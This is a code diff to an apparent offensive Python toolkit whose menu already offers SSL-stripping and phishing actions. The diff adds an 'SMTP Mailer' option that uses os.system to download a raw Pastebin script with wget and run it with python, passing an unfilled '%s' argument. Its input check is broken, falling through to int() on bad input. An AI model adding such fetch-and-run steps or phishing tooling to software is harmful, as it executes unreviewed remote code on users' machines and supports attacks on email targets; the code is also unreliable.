@@ -171,6 +171,50 @@ class PyPisher:
         safe_print(ctx, "\n[*] PyPisher session finished.\n")
 # endregion
 
+# region: override class: smtpfetcher
+class SMTPFetcher:
+    menu_items = [
+        "Run interactive",
+        "Back"
+    ]
+        
+    def __init__(self, ctx=None):
+        self.ctx = ctx or {}
+
+    def run(self, ctx):
+        self.ctx = ctx
+        safe_print(ctx, f"[*] SMTPFetcher: selected '{ctx.get('item')}'")
+        self.sub_menu(ctx)
+
+    def sub_menu(self, ctx):
+        safe_print(ctx, "\nSMTPFetcher options:")
+        for i, it in enumerate(self.menu_items, 1):
+            safe_print(ctx, f"  [{i}] {it}")
+        safe_print(ctx, "")
+            
+        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
+        
+        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
+            self.__init__()
+
+        idx = int(choice) - 1
+        sel = self.menu_items[idx]
+
+        if sel.lower() == "back":
+            return
+
+        if "interactive" in sel:
+            self.run_interactive(ctx)
+
+    def run_interactive(self, ctx):
+        safe_print(ctx, "\n[*] Starting smtpfetcher session.\n")
+
+        os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
+        os.system("python smtp.py %s")
+
+        safe_print(ctx, "\n[*] SMTPFetcher session finished.\n")
+# endregion
+
 # region: actions utility
 def run_action(action, ctx):
     if isinstance(action, type):
@@ -202,7 +246,7 @@ def execute(ctx):
     actions = {
         "SSLtrip": SSLtrip,
         "pyPISHER": PyPisher,
-        #"SMTP Mailer"
+        "SMTP Mailer": SMTPFetcher
     }
 
     action = actions.get(item)
